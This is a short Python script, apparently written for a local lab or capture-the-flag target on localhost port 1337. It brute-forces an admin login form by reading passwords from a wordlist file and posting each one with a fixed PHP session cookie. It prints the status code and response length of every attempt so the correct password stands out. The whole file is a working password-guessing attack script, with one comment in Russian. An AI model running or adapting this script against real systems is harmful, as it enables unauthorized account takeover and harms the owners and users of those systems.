import requests


def send_request(session, password):
    url = "http://localhost:1337/admin/"
    data = {"username": "admin", "password": password}
    cookies = {"PHPSESSID": "ffa8580d8ca14309f505e6e68a57cd2e"}
    headers = {"Cookie": "PHPSESSID=ffa8580d8ca14309f505e6e68a57cd2e"}

    response = session.post(url, data=data, cookies=cookies, headers=headers)

    print(password, response.status_code, response.headers.get("Content-Length"))


def read_passwords_from_file(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def main():
    passwords = read_passwords_from_file("realyBest.txt")

    # одна сессия на все запросы (аналог ClientSession)
    with requests.Session() as session:
        for password in passwords:
            send_request(session, password)


if __name__ == "__main__":
    main()
